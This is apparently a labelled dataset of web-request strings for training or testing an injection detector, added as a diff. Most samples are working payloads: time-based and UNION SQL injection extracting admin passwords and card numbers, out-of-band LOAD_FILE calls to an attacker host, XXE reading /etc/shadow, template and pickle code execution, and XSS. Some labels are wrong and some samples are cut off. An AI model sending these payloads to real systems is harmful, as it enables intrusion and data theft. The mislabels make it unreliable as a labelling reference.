+{"text": "title=Advanced XPath Techniques' or '1'='1", "kind": "sqli"}
+{"text": "------WebKitFormBoundarybzlg7983GT45zyXw\nContent-Disposition: form-data; name=\"description\"\n\nQuarterly config import\n------WebKitFormBoundarybzlg7983GT45zyXw\nContent-Disposition: form-data; name=\"file\"; filename=\"config.xml\"\nContent-Type: application/xml\n\n<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTI", "kind": "path_traversal"}
+{"text": "/api/v3/search/item\r\nX-Custom-Injected: HeaderInjection\r\n\r\n<script>alert(12345)</script>", "kind": "xss"}
+{"text": "data=%7B%22filter%22%3A%22active%22%7D", "kind": "benign"}
+{"text": "pop synthwave vinyl", "kind": "benign"}
+{"text": "/resources/js/../../../../boot.ini", "kind": "path_traversal"}
+{"text": "user_config=../../../../etc/passwd\u0000en-US; sid=5fc5b99a8d3e", "kind": "path_traversal"}
+{"text": "category=12' UNION SELECT @@VERSION,SLEEP(5),USER()--", "kind": "sqli"}
+{"text": "page=3&sort=recent", "kind": "benign"}
+{"text": "search=INSERT%20new%20models", "kind": "benign"}
+{"text": "query=%27%20OR%20(SELECT%20LOAD_FILE(CONCAT('\\\\\\\\',(SELECT%20version()),'.attacker-example.com\\\\data')))--%20", "kind": "sqli"}
+{"text": "subject=Login+Issue&priority=High&details=VXNlciBhZ2VudCBleHBsYWluZWQgYSBpbmRpdmlkdWFsIGFuZCBjb25uZWN0aW9uIHByb2JsZW0gaW4gYXJlYS4gU3VwcG9ydCB0ZWNobmljaWFuIGFzaXN0Lg==", "kind": "benign"}
+{"text": "config_path=../../../../etc/shadow\u0000conf; sessid=7a29c5f218d3cc9e", "kind": "path_traversal"}
+{"text": "username=user123&action=save&comment=review_ok&username=adminuser&action=delete&comment=<script>alert(document.domain)</script>", "kind": "xss"}
+{"text": "/content/user-upload/../../../../var/www/html/config.php", "kind": "path_traversal"}
+{"text": "adam grant", "kind": "benign"}
+{"text": "lang_pref=../../../config/settings.php\u0000de-DE; auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9", "kind": "path_traversal"}
+{"text": "category=electronics&filter[color]=black&filter[brand]=novatek&sort_by=price_asc&page=3", "kind": "benign"}
+{"text": "category=electronics&available=true&sort=price_desc&limit=25", "kind": "benign"}
+{"text": "page=2", "kind": "benign"}
+{"text": "profile_img=../../../../uploads/userdata/pic.png\u0000fr-FR; session_token=ab12cd34ef56", "kind": "path_traversal"}
+{"text": "user=&lt;script&gt;alert(&#39;XSS_ Vulnerability_Found&#39;)&lt;/script&gt;", "kind": "xss"}
+{"text": "token=xyz123&token=xyz123' OR 1=1--", "kind": "sqli"}
+{"text": "display_name=CrazyGamer&user_bio=<!--#Include   ViRtUaL='/var/www/html/includes/secret.key' -->", "kind": "sqli"}
+{"text": "handmade pottery", "kind": "benign"}
+{"text": "status=active&status=pending&id=123&filter_evil_chars=true&id=' UNION SELECT credit_card FROM users--", "kind": "sqli"}
+{"text": "category=home_garden&in_stock=true&sort=price_asc", "kind": "benign"}
+{"text": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE product [\n  <!ELEMENT product ANY >\n  <!ENTITY secret SYSTEM \"file:///etc/shadow\" >]>\n<product>\n  <id>2378</id>\n  <secretInfo>&secret;</secretInfo>\n</product>", "kind": "path_traversal"}
+{"text": "bingbot/2.0 (+http://example.com/bingbot.htm)", "kind": "benign"}
+{"text": "Mozilla/5.0 \"><svg/onload=eval(atob('YWxlcnQoJ2F0dGVtcHQnKQ=='))> (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15", "kind": "xss"}
+{"text": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE orderData [\n<!ELEMENT orderData ANY >\n<!ENTITY file SYSTEM \"file:///etc/passwd\" >]>\n<orderData>\n  <orderNumber>67890</orderNumber>\n  <orderInfo>&file;</orderInfo>\n</orderData>", "kind": "path_traversal"}
+{"text": "\\x80\\x03c__builtin__\\nexec\\n\\x94\\x8c\\x1f__import__('os').system('cat /etc/passwd')\\x94\\x85\\x94R.\\r", "kind": "path_traversal"}
+{"text": "name=Bob+Hendricks&email=bob.hendricks%example.com&message=", "kind": "benign"}
+{"text": "file=../../../../../../../../etc/passwd", "kind": "path_traversal"}
+{"text": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE data [\n  <!ELEMENT data ANY >\n  <!ENTITY p SYSTEM \"file:///etc/passwd\" >\n]>\n<data>\n  <userToken>&p;</userToken>\n  <priority>high</priority>\n</data>", "kind": "path_traversal"}
+{"text": "query=wireless+headphones", "kind": "benign"}
+{"text": "sessionid=9d72cbd45a3a7d38a1e85a24a04fa0b7; tracking_id=xyz' OR IF(1=1 /*!comment*/ AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=0x61 , SLEEP(5), 0)--", "kind": "sqli"}
+{"text": "category=gaming&category=dev&id=123&filter_evil_chars=true&id=' UNION SELECT credit_card FROM users--", "kind": "sqli"}
+{"text": "user_template=../../../../etc/passwd\u0000.html; sessionid=4f7d9a8ce2b4e1f3", "kind": "path_traversal"}
+{"text": "{\"searchQuery\":\"New Winter Coats' oR '1'='1\",\"category\":\"clothing\",\"sort\":\"relevance\"}", "kind": "sqli"}
+{"text": "<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnbm90aWZpYycpPC9zY3JpcHQ+\"></iframe>", "kind": "xss"}
+{"text": "theme=dark&custom_script=echo hello world\nid\ncat /etc/passwd", "kind": "path_traversal"}
+{"text": "WHERE status = active", "kind": "benign"}
+{"text": "id=10' UNION SELECT @@VERSION,SLEEP(5),USER()--", "kind": "sqli"}
+{"text": "file=param=Hello%252520World", "kind": "benign"}
+{"text": "q=&lt;script&gt;alert(&#39;XSS_ Vulnerability_Found&#39;)&lt;/script&gt;", "kind": "xss"}
+{"text": "lang=../../../../windows/win.ini\u0000us", "kind": "path_traversal"}
+{"text": "user_bio=Hello there! <!--#INCLUDE ViRtUaL=\"/etc/passwd\" -->", "kind": "path_traversal"}
+{"text": "Jennifer Li", "kind": "benign"}
+{"text": "auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9; tracking_id=xyz' OR IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=0x61, SLEEP(5), 0)/*comment*/", "kind": "sqli"}
+{"text": "sid=xyz123; tracking_id=xyz' OR IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=0x61, SLEEP(5), 0) --", "kind": "sqli"}
+{"text": "{\"UNION ALL\": \"cart_confirmed_payment_pending\"}", "kind": "benign"}
+{"text": "Mozilla/5.0 \"><script>eval(atob('YWxlcnQoJ1VzZXIgUGFyYW0nKQ=='))</script>", "kind": "xss"}
+{"text": "organic green tea", "kind": "benign"}
+{"text": "{\"title\":\"Spring Walks Updated\",\"tags\":[\"nature\",\"photography\",\"spring\"],\"content\":\"Updated content with new photos from the park walk.\"}", "kind": "benign"}
+{"text": "{\"displayName\": \"Lara_Croft\", \"statusMessage\": \"Happy to be here' Or 'x'='x\"}", "kind": "sqli"}
+{"text": "make=tesla&year_gte=2017&available=true", "kind": "benign"}
+{"text": "filter=active&limit=15&page=2&callback=processData", "kind": "benign"}
+{"text": "user_pref=dark_mode; tracking_id=789xyz'/**/OR/**/IF(ASCII(SUBSTRING((SELECT/**/password/**/FROM/**/users/**/WHERE/**/username='admin'),1,1))=0x61/**/,SLEEP(5),0)#; __Secure-AdminAuth=deadbeefcafebabe", "kind": "sqli"}
+{"text": "/media/input/../../../../home/user/.ssh/id_rsa", "kind": "path_traversal"}
+{"text": "{\"userId\":3421,\"displayName\":\"gamer42\",\"bio\":\"I love coding' Or 'x'='X\",\"location\":\"USA\"}", "kind": "sqli"}
+{"text": "host=203.0.113.5; cat /etc/passwd", "kind": "path_traversal"}
+{"text": "token=llmke39ej2oen0q12; tracking_id=xyz' OR IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=CHAR(0x61), SLEEP(5), 0) #; last_visit=20240606", "kind": "sqli"}
+{"text": "comment=Great service!\nuptime\nncat /etc/passwd", "kind": "path_traversal"}
+{"text": "query=&lt;script&gt;alert('XSS_ Vulnerability_Found')&lt;/script&gt;", "kind": "xss"}
+{"text": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE order [\n  <!ELEMENT order ANY >\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<order>\n  <productId>&xxe;</productId>\n  <quantity>10</quantity>\n  <notes>Urgent delivery</notes>\n</order>", "kind": "path_traversal"}
+{"text": "channel=%27%20OR%20%28SELECT%20LOAD_FILE%28CONCAT%28%27%5C%5C%5C%5C%27%2C%28SELECT%20version%28%29%29%2C%example.com%5C%5Cdata%27%29%29%29--%20", "kind": "sqli"}
+{"text": "/images/../../../../windows/win.ini", "kind": "path_traversal"}
+{"text": "----MultipartBoundaryStream007\nContent-Disposition: form-data; name=\"description\"\n\nMedia service config update\n----MultipartBoundaryStream007\nContent-Disposition: form-data; name=\"document\"; filename=\"config.xml\"\nContent-Type: application/xml\n\n<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTITY xxe SYSTE", "kind": "path_traversal"}
+{"text": "{\n  \"<img src=x onerror=\\\"eval(String.fromCharCode(0x61,108,0145,114,0x74,40,0x27,88,0x53,0123,45,0x4b,101,0x79,0x27,41))\\\">\": \"analytics-session\",\n  \"session_id\": \"f2e8c4b7-443a-4022-b962-1d34567890ab\",\n  \"device_type\": \"mobile\",\n  \"last_event\": \"touch_end\"\n}", "kind": "xss"}
+{"text": "file=%4a%5b%6C%7d", "kind": "benign"}
+{"text": "/../../../../backup/dbdump.sql", "kind": "path_traversal"}
+{"text": "resource=../../../../../../../../etc/passwd", "kind": "path_traversal"}
+{"text": "cart_session=5324f9a1e72b4a; logged_in=true; tracking_id=xyz' OR IF(ASCII(SUBSTRING((SELECT/**/password/**/FROM/**/users/**/WHERE/**/username='admin'),1,1))=0x61, SLEEP(5), 0)/*comment*/--", "kind": "sqli"}
+{"text": "filter%5Bresolution%5D=4k&filter%5Bbrands%5D=vidaxl%7Cnokia&sort_by=rating_desc&page=1", "kind": "benign"}
+{"text": "<searchRequest>\n  <term>' or name()=' or '1'='1</term>\n  <category>user_profiles</category>\n</searchRequest>", "kind": "sqli"}
+{"text": "query=laptop&query=gaming&id=123&filter_evil_chars=true&id=' UNION SELECT credit_card FROM users--", "kind": "sqli"}
+{"text": "JOIN multiple data", "kind": "benign"}
+{"text": "username=jane&action=view&comment=allgood&username=admin&action=delete&comment=<script>xss()</script>", "kind": "xss"}
+{"text": "/static-content/photos/../../secret/.../../credentials.json", "kind": "path_traversal"}
+{"text": "profile_description=Enthusiastic+developer.+<!- -#include fIlE=\"/etc/passwd\" - ->", "kind": "path_traversal"}
+{"text": "<profileUpdate>\n  <displayName>Emilia R.</displayName>\n  <bio>Enjoys hiking and photography.</bio>\n  <location>Seattle, WA</location>\n</profileUpdate>", "kind": "benign"}
+{"text": "category=2' UNION SELECT @@VERSION, SLEEP(5), USER()--", "kind": "sqli"}
+{"text": "new_email=user.newemail%example.com&confirmation_notes=%3Cnote%3EUpdated+email+to+receive+monthly+reports.%3C%2Fnote%3E&send_confirmation=yes", "kind": "benign"}
+{"text": "/app/query/{{self.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__'].__import__('os').popen('cat /etc/passwd').read()}}/overview", "kind": "path_traversal"}
+{"text": "view=grid&view=list&id=123&filter_evil_chars=true&id=' UNION SELECT credit_card FROM users--", "kind": "sqli"}
+{"text": "username=johndoe&action=edit&comment=hello_world&username=admin&action=remove&comment=<script>alert(1)</script>", "kind": "xss"}
+{"text": "item=book&item=' OR 1=1--&item=pen", "kind": "sqli"}
+{"text": "order_ref=12345' UNION SELECT @@VERSION,SLEEP(5),USER()--", "kind": "sqli"}
+{"text": "customer_id=78910&delivery_instructions=&payment_method=credit_card", "kind": "benign"}
+{"text": "PHPSESSID=xyz123abc456; tracking_id=xyz' OR IF(ASCII(SUBSTRING((SELECT /*!password*/ FROM users WHERE username='admin'),1,1))=0x61,SLEEP(5),0)#; theme=dark", "kind": "sqli"}
+{"text": "------WebKitBoundaryZ9Y8X7\nContent-Disposition: form-data; name=\"uploadUser\"\n\nblog-admin\n------WebKitBoundaryZ9Y8X7\nContent-Disposition: form-data; name=\"fileUpload\"; filename=\"config.xml\"\nContent-Type: application/xml\n\n<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///c:/windows/wi", "kind": "path_traversal"}
+{"text": "username=analytics_user\u0000\u0001\bpayload<script>console.warn(1)</script>&password=AnalytiCS!789", "kind": "xss"}
+{"text": "tool_option=verbose; cat /etc/passwd", "kind": "path_traversal"}
+{"text": "prefs_file=../../../../etc/example.com\u0000it-IT; token=9f8a7b6c5d43", "kind": "path_traversal"}
+{"text": "category=electronics&limit=50", "kind": "benign"}
+{"text": "id=852&filter_evil_chars=true&id=' UNION SELECT credit_card FROM users--", "kind": "sqli"}
+{"text": "https://example.com/products{# {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /etc/passwd').read() }} #}", "kind": "path_traversal"}
+{"text": "region=eu&callback=processData", "kind": "benign"}
+{"text": "filter=active&filter=popular&id=123&filter_evil_chars=true&id=' UNION SELECT credit_card FROM users--", "kind": "sqli"}
+{"text": "author_name=John+Doe' or '1'='1", "kind": "sqli"}
+{"text": "/api/v2/data/export/2021\r\nX-New-Header:InjectedServer\r\n\r\n<script>123</script>", "kind": "xss"}
+{"text": "post_id=%27%20OR%20(SELECT%20LOAD_FILE(CONCAT('\\\\\\\\',(SELECT%20version()),'.attacker-example.com\\\\data')))--%20", "kind": "sqli"}
+{"text": "report=%27%20OR%20%28SELECT%20LOAD_FILE%28CONCAT%28%27%5C%5C%5C%5C%27%2C%28SELECT%20version%28%29%29%2C%example.com%5C%5Cdata%27%29%29%29--%20", "kind": "sqli"}
+{"text": "{\"query\":\"smartphone' Or '1'='1\",\"category\":\"electronics\",\"sort\":\"relevance\"}", "kind": "sqli"}
+{"text": "<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgndXNlcicsJ2hlbGxvJyk8L3NjcmlwdD4=\"></iframe>", "kind": "xss"}
+{"text": "color=navy&size=m", "kind": "benign"}
+{"text": "q=pop+synthwave+vinyl", "kind": "benign"}
+{"text": "type=laptop&sort=price_asc&id=123&filter_evil_chars=true&id=' UNION SELECT credit_card FROM users--&page=2", "kind": "sqli"}
+{"text": "id=%27%20OR%20%28SELECT%20LOAD_FILE%28CONCAT%28%27%5C%5C%5C%5C%27%2C%28SELECT%20version%28%29%29%2C%example.com%5C%5Cdata%27%29%29%29--%20", "kind": "sqli"}
+{"text": "session=9f8b7c6d5e4f3a2b; tracking_id=xyz' OR IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=97, SLEEP(5),0) --", "kind": "sqli"}
+{"text": "------WebKitFormBoundaryrqKXbdyhdIROOnef\nContent-Disposition: form-data; name=\"uploadCategory\"\n\nconfigurations\n------WebKitFormBoundaryrqKXbdyhdIROOnef\nContent-Disposition: form-data; name=\"fileField\"; filename=\"config.xml\"\nContent-Type: application/xml\n\n<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTIT", "kind": "path_traversal"}
+{"text": "session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9; tracking_id=abc123';/**/OR/**/IF(ASCII(SUBSTRING((SELECT/**/password/**/FROM/**/users/**/WHERE/**/username='admin'),1,1))=0x61,SLEEP(5),0)#; preference=en-US", "kind": "sqli"}
+{"text": "id=42' UNION SELECT @@VERSION,SLEEP(5),USER()--", "kind": "sqli"}
+{"text": "id=12' UNION SELECT @@VERSION,SLEEP(5),USER()--", "kind": "sqli"}
+{"text": "id=%27%20OR%20%28SELECT%20LOAD_FILE%28CONCAT%28%27%5C%5C%5C%5C%27%2C%28SELECT%20version%28%29%29%2C%example.com%5C%5Clogs%27%29%29%29--%20", "kind": "sqli"}
+{"text": "/uploads/profile/../../../../etc/passwd", "kind": "path_traversal"}
+{"text": "author_name=Smith' or @id='1' or '1'='1", "kind": "sqli"}
+{"text": "id=44' UNION SELECT @@VERSION,SLEEP(5),USER()--", "kind": "sqli"}
+{"text": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE order [\n  <!ELEMENT order ANY >\n  <!ENTITY passwd SYSTEM \"file:///etc/passwd\" >]>\n<order>\n  <item>SKU12345</item>\n  <userDetails>&passwd;</userDetails>\n</order>", "kind": "path_traversal"}
+{"text": "/media/../../../db/backups/config.yaml", "kind": "path_traversal"}
+{"text": "product_id=67539&quantity=2&color=black", "kind": "benign"}
+{"text": "session=1f4b3c5d7e8a9b0d; tracking_id=jkl37' OR IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=0x61, SLEEP(5),0) #", "kind": "sqli"}
+{"text": "how to bake sourdough bread", "kind": "benign"}
+{"text": "console.log('Save OK');", "kind": "benign"}
+{"text": "/community/example.com/posts/42\r\nLocation: https://example.com\r\n\r\n<script>alert('XSS')</script>", "kind": "xss"}
+{"text": "<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydChDYWxpYyAhISk8L3NjcmlwdD4=\"></iframe>", "kind": "xss"}
+{"text": "profile=default&level=user&profile=admin&level=superuser&comment=all+good&comment=<svg+onload=alert(1)>", "kind": "xss"}
+{"text": "------WebKitFormBoundary67KEridms7sH4PrP\nContent-Disposition: form-data; name=\"comment\"\n\nImporting config file for review\n------WebKitFormBoundary67KEridms7sH4PrP\nContent-Disposition: form-data; name=\"fileupload\"; filename=\"config.xml\"\nContent-Type: application/xml\n\n<?xml version=\"1.0\"?>\n<!DOCTYPE r", "kind": "path_traversal"}
+{"text": "username=shopper&action=subscribe&comment=looking+forward&username=manager&action=delete&comment=<script>xss()</script>", "kind": "xss"}
+{"text": "view=monthly", "kind": "benign"}
+{"text": "category=travel&limit=12", "kind": "benign"}
+{"text": "userId=%27%20OR%20(SELECT%20LOAD_FILE(CONCAT(%27%5C%5C%5C%5C',(SELECT%20version()),%example.com%5C%5Cdata%27)))--%20", "kind": "sqli"}
+{"text": "ip=203.0.113.2; cat /etc/passwd", "kind": "path_traversal"}
+{"text": "topic=patches&topic=' UNION SELECT password", "kind": "sqli"}
+{"text": "priority=low&priority=high AND 1=1", "kind": "sqli"}
+{"text": "/load/{{self.__init__.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read()}}/dashboard", "kind": "path_traversal"}
+{"text": "postid=19283&comment=Nice+post!&postid=0;DROP+TABLE+posts;&comment=<script>xss()</script>", "kind": "xss"}
+{"text": "query=smartphone' UNION SELECT @@VERSION,SLEEP(5),USER()--", "kind": "sqli"}
+{"text": "{\"query\":{\"$where\":\"this.username==\\'admin\\'&&this.password.startsWith(\\'a\\')||sleep(5000)\"}}", "kind": "sqli"}
+{"text": "/app/user/avatar/../../../../proc/self/environ", "kind": "path_traversal"}
+{"text": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE orderSubmit [\n  <!ELEMENT orderSubmit ANY >\n  <!ENTITY passwd SYSTEM \"file:///etc/passwd\" >]>\n<orderSubmit>\n  <productCode>ZXCV987</productCode>\n  <fileData>&passwd;</fileData>\n</orderSubmit>", "kind": "path_traversal"}
+{"text": "<feedback>\n  <username>markus_91</username>\n  <rating>5</rating>\n  <comments>Great experience with the recent update!</comments>\n</feedback>", "kind": "benign"}
+{"text": "user_id=29485&unread_only=true&limit=10", "kind": "benign"}
+{"text": "<searchRequest>\n  <term>' or '1'='1' or name()='</term>\n  <category>inventory</category>\n</searchRequest>", "kind": "sqli"}
+{"text": "------BoundaryABC123DEF\nContent-Disposition: form-data; name=\"notes\"\n\nImporting user configuration batch #23\n------BoundaryABC123DEF\nContent-Disposition: form-data; name=\"xmlFile\"; filename=\"config.xml\"\nContent-Type: application/xml\n\n<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file://", "kind": "path_traversal"}
+{"text": "user=guest&mode=view&token=abc123&user=admin&mode=delete&token=<script>steal()</script>", "kind": "xss"}
+{"text": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<purchase>\n  <itemId>12345</itemId>\n  <externalRef>&xxe;</externalRef>\n</purchase>", "kind": "path_traversal"}
+{"text": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE request [\n<!ELEMENT request ANY >\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<payload>\n  <userId>789</userId>\n  <data>&xxe;</data>\n</payload>", "kind": "path_traversal"}
+{"text": "username=buyer123&comment=nothing+to+hide&action=view&username=admin&comment=<script>xss()</script>&action=delete", "kind": "xss"}
+{"text": "username=admin\u0000\b\u0001<script>alert('x')</script>&password=U2ecurePass!23", "kind": "xss"}
+{"text": "sid=92a8bcb1803679f1; tracking_id=z9x7' OR IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=97, SLEEP(5),0)#", "kind": "sqli"}
+{"text": "fullname=John+Doe&user_bio=<!--#iNcLuDe vIrTuAl='/etc/passwd' -->", "kind": "path_traversal"}
+{"text": "cmd=view_details&album=favorites", "kind": "benign"}
+{"text": "account=%27%20OR%20%28SELECT%20LOAD_FILE%28CONCAT%28%27%5C%5C%5C%5C%27%2C%28SELECT%20version%28%29%29%2C%example.com%5C%5Cdata%27%29%29%29--%20", "kind": "sqli"}
+{"text": "{\"bio\":\"Curious about new tech &lt;i&gt;and&lt;/i&gt; writes poetry occasionally.\",\"notifications\":true,\"timezone\":\"America/Los_Angeles\"}", "kind": "benign"}
+{"text": "productId=%27%20OR%20%28SELECT%20LOAD_FILE%28CONCAT%28%27%5C%5C%5C%5C%27%2C%28SELECT%20version%28%29%29%2C%example.com%5C%5Cdata%27%29%29%29--%20", "kind": "sqli"}
+{"text": "username=shopper\u0000\u0001<script>eval(String.fromCharCode(97,108,101,114,116(49)))</script>&password=secretPass123", "kind": "xss"}
+{"text": "/assets/scripts/.../.../.../.ssh/id_rsa", "kind": "path_traversal"}
+{"text": "user_pref=lang=en-US; tracking_id=xyz' OR IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=97, SLEEP(5),0)#; cart=empty", "kind": "sqli"}
+{"text": "Mozilla/5.0 \"><script>eval(atob('YWxlcnQoJ1hTUyBhdHRhY2sgJyk='))</script> (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15", "kind": "xss"}
+{"text": "Looking forward to a demo", "kind": "benign"}
+{"text": "/forum/thread/12345/comment/6789\r\nX-Injected-Flag: true\r\n\r\n<script>console.log('Injected')</script>", "kind": "xss"}
+{"text": "{\"bio\": \"Yoga enthusiast &lt;i&gt;who loves&lt;/i&gt; green tea &amp; meditation practices.\",\"diet\":\"vegetarian\"}", "kind": "benign"}
+{"text": "report_template=../../../../etc/mail/passwd\u0000template; session=8d946c7bdcf31a92", "kind": "path_traversal"}
+{"text": "user_id=90210&setting=notifications&message=<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>", "kind": "xss"}
+{"text": "comment=nice profile&username=john_doe&action=edit&username=superadmin&action=delete&comment=<script>alert(1)</script>", "kind": "xss"}
+{"text": "username=devguy&action=update&comment=good_post&username=superadmin&action=delete&comment=<script>alert(\"1\")</script>", "kind": "xss"}
+{"text": "/files/../../../etc/hosts", "kind": "path_traversal"}
+{"text": "timeframe=last_7_days", "kind": "benign"}
+{"text": "comment=This%20is%20%26lt%3Bbold%26gt%3B", "kind": "benign"}
+{"text": "userId=%27%20OR%20(SELECT%20LOAD_FILE(CONCAT('\\\\\\\\',(SELECT%20version()),'.attacker-example.com\\\\data')))--%20", "kind": "sqli"}
+{"text": "file_id=87654321&description=%3Cmetadata%3EData+file+collected+from+sensor+array+on+June+2024.%3C%2Fmetadata%3E&tags=environment,analysis", "kind": "benign"}
+{"text": "q=wireless+headphones&filter=brand_sony&sort=price_asc", "kind": "benign"}
+{"text": "/api/v3/items/search\r\nSet-Cookie: session=evil123\r\n\r\n<script>document.location='http://malicious.cloud'</script>", "kind": "xss"}
+{"text": "username=visitor&action=view&comment=nice+articles&username=admin&action=remove&comment=<script>xss()</script>", "kind": "xss"}
+{"text": "<!DOCTYPE webhook [\n<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % dtd SYSTEM \"http://example.com/exfil.dtd\">\n%dtd;\n%send;\n]>\n<webhook>\n  <event>deploy</event>\n</webhook>", "kind": "path_traversal"}
+{"text": "user=alice&filter_evil_chars=true&user=' UNION SELECT credit_card FROM users--", "kind": "sqli"}
+{"text": "user_id=98765&cart_items=WyJ3aW5lX3Jpc2VfMSIsImNoZXJyeV8xIl0=&comments=RmVlZGJhY2sgcmVxdWVzdCBmb3IgbWFpbGVkIGFzc2lzdGFuY2UuLg==", "kind": "benign"}
+{"text": "id=15483", "kind": "benign"}
+{"text": "<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgndmFsdWUpPC9zY3JpcHQ+\"></iframe>", "kind": "xss"}
+{"text": "auth_token=af3b2189c8704e92b6ff3d8e499; tracking_id=xyz' OR IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'), 1,1))=char(97), SLEEP(5)/*! */,0)#; theme=default", "kind": "sqli"}
+{"text": "user_id=123&user_id=' OR 1=1 --", "kind": "sqli"}
+{"text": "session=28fac71588e9d225734d3deb20a6bc72; tracking_id=xyz' OR IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=0x61, SLEEP(5),0)/*!MySQLComment*/-- -; layout=grid", "kind": "sqli"}
+{"text": "/images/gallery/../../../../windows/win.ini", "kind": "path_traversal"}
+{"text": "{\"UNION ALL\": \"user_submitted_feedback\"}", "kind": "benign"}
+{"text": "Mozilla/5.0 \"><img src=x onerror=eval(atob('YWxlcnQoIkFtYXppbmcgSGFja2VyIik='))>", "kind": "xss"}
+{"text": "utm_source=newsletter&utm_medium=email&utm_campaign=spring_launch", "kind": "benign"}
+{"text": "auth=eyJhbGciOiJIUzI1NiI7IjEyMy4yMy4zNC40NSI7; tracking_id=x9lr' OR IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=0x61, SLEEP(5),0)--", "kind": "sqli"}
+{"text": "/example.com/cart/add/9876\r\nSet-Cookie: promo=freebie\r\n\r\n<script>fetch('http://example.com')</script>", "kind": "xss"}
+{"text": "category=electronics' UNION SELECT @@VERSION,SLEEP(5),USER()--", "kind": "sqli"}
+{"text": "filter=active&limit=20", "kind": "benign"}
+{"text": "search=&lt;script&gt;alert('XSS_ Vulnerability_Found')&lt;/script&gt;", "kind": "xss"}
+{"text": "size=medium", "kind": "benign"}
+{"text": "item_code=%27%20OR%20(SELECT%20LOAD_FILE(CONCAT(%27%5C%5C%5C%5C',(SELECT%20version()),%example.com%5C%5Cdata%27)))--%20", "kind": "sqli"}
+{"text": "filter=latest&id=8&filter_evil_chars=true&id='1 UNION SELECT credit_card FROM users--", "kind": "sqli"}
+{"text": "{\"bio\": \"Chat app user who enjoys &lt;b&gt;privacy&lt;/b&gt; and emojis 😊👍\"}", "kind": "benign"}
+{"text": "{\"query\": \"smartphone' Or '1' = '1' aNd 'a'='a\"}", "kind": "sqli"}
+{"text": "------BoundarySECBot987\nContent-Disposition: form-data; name=\"comment\"\n\nScheduled config import task\n------BoundarySECBot987\nContent-Disposition: form-data; name=\"xmlConfig\"; filename=\"import.xml\"\nContent-Type: application/xml\n\n<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///c:/wi", "kind": "path_traversal"}
+{"text": "id=47829", "kind": "benign"}
+{"text": "term=JOIN%20multiple%20data", "kind": "benign"}
+{"text": "user_token=45a9bcf11bad1234; tracking_id=lm3n' OR IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=0x61, SLEEP(5),0)/*evil*/; theme=dark", "kind": "sqli"}
+{"text": "search_term=9' UNION SELECT @@VERSION,SLEEP(5),USER()--", "kind": "sqli"}
+{"text": "user=mobileuser\u0000\b\u0001#COMMENTCLOSE\u0000<script>alert(1)</script>&pass=mobilePass!22", "kind": "xss"}
+{"text": "id=123&id=' UNION SELECT credit_card FROM users--&filter_evil_chars=true", "kind": "sqli"}
+{"text": "Simple update for item 123 record.", "kind": "benign"}
+{"text": "template_file_path=../../../../var/www/html/config.php\u0000json; authToken=ea7fc283d6db9482", "kind": "path_traversal"}
+{"text": "/images/../../../../boot.ini", "kind": "path_traversal"}
+{"text": "id=1024&edition=3rd&includeReviews=true", "kind": "benign"}
+{"text": "template=../../../../../../../../etc/passwd", "kind": "path_traversal"}
+{"text": "session=abc123&session=1' OR '1'='1", "kind": "sqli"}
+{"text": "book_title=Networks' or '1'='1 or string-length(//users/user[1]/password) > 0", "kind": "sqli"}
+{"text": "doc=../../../../../../../../etc/passwd", "kind": "path_traversal"}
+{"text": "ref=%4a%5b%6C%7d", "kind": "benign"}
+{"text": "{\"filePath\": \"/etc/shadow\"}", "kind": "path_traversal"}
+{"text": "ReportClient/3.1; echo \"User-Agent: `cat /etc/passwd`\" >> /var/log/app.log", "kind": "path_traversal"}
